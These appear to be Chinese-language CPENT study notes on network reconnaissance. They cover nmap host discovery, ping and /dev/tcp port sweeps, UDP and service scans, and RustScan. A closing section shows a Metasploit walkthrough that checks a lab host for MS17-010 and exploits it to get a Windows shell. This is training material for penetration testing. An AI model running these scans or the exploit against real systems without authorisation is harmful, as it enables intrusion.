掃描
===
> CPENT掃描很重要 因為靶機都會開防火牆

# scan
```bash
nmap 192.168.0.7 -sn -n --packet-trace
# CONN -> TCP 80、443

sudo nmap 192.168.0.7 -sn -n --packet-trace
# ARP -> 因為有權限可以call raw socket了
# 防火牆一定沒辦法檔ARP 因為ARP是網路的基本

sudo nmap scanme.nmap.org -sn -n --packet-trace
# ICMP type=8 type=13
# CONN 80,443
# 基本上如果這些防火牆全檔的話 就找不到這台機器

sudo nmap scanme.nmap.org -sn -PS22,80,445,3389 -n --packet-trace
# windows : 139/445,3389
# Linux   : 22,80
# 基本這些是會開的，所以找這些port來判斷這台機器有沒有活這
```
```bash
nmap 192.168.0.* -sn -oG -  #-oG 轉為比較適合grep的格式

nmap 192.168.0.* -sn -oG - | grep Up | cut -d' ' -f2 > ip_list

# ICMP script
ping -c 1 192.168.0.7
ping -c 1 192.168.0.7 | grep "bytes from"
for ip in {1..254};do (ping -c 1 192.168.0.$ip | grep "bytes from" &);done

# 精隨 arp 擋不住
cat /proc/net/arp
```

# port
```bash
nmap 192.168.0.70
nmap 192.168.0.70 --top 1000
# Default 只掃描1000個port

cat /usr/share/nmap/nmap-services

nmap 192.168.0.70 --top 100
nmap 192.168.0.70 --top 3 #23 80 443
nmap 192.168.0.70 --top 1 #80


# All Scan
nmap 192.168.0.70 -p -
```
```bash
bash -c 'echo > /dev/tcp/192.168.0.70/22 && echo open'
bash -c 'for port in {1..100}; do (echo > /dev/tcp/192.168.0.70/$port && echo $port open &);done' 2> /dev/null
```
UDP
```bash
sudo nmap -sU -p137-139 192.168.0.70

sudo nmap -sU -p137-139 -n -Pn --packet-trace --reason 192.168.0.70

# UDP SCAN 53,69,137,138,161,1900,5353  考試161須注意
```

# Service
```bash
nmap 192.168.0.7 -p47001
# winrm -> rm over SOAP -> XML over HTTP

nmap 192.168.0.7 -p445 -sV -sC
# -sC  :  ls /usr/share/nmap/scripts
nmap 192.168.0.7 -p445 -script vulners
nmap 192.168.0.7 -sV -p445 -script smb-protocols
```

# RustScan
```bash
# 暴力 從1掃到65535 的工具
# https://github.com/RustScan/RustScan/releases

wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb

sudo dpkg -i rustscan_2.0.1_amd64.deb

# compare
nmap 192.168.0.7 -p-
rustscan -a 192.168.0.7 -u 5000 -t 8000 --scripts none

rustscan -a 192.168.0.7 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

```
# MS17-010
```bash
nmap 192.168.0.7 -sVC -n -Pn # -n不做名稱解析
nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-protocals.nse
# smb v1 -> MS17_010
nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-vuln-ms17-010.nse

```
metasploit
```bash
msfconsole -q

# set payload
search ms17_010
use 2
show options
set rhosts 192.168.0.7
check
exploit

# win
getuid
shell
whoami
```

# Day-1 HW
```bash
# Computer Name
# OS / Server Version
# SSH key

sudo nmap 192.168.0.* -sn -oG - | grep Up | cut -d ' ' -f2 > ip_list

sudo nmap -iL ip_list -O -Pn -n

sudo nmap -iL ip_list -p22 -sVC

```
> nmap static binary